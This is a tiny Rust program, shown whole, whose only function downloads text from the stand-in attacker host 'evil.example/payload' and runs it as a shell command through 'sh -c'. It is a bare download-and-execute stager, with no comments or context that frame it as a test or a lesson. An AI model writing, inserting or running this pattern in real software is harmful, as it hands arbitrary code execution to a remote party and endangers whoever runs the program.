use std::process::Command;

fn main() {
    let body = reqwest::blocking::get("http://evil.example/payload")
        .unwrap()
        .text()
        .unwrap();
    Command::new("sh").arg("-c").arg(body).output().unwrap();
}
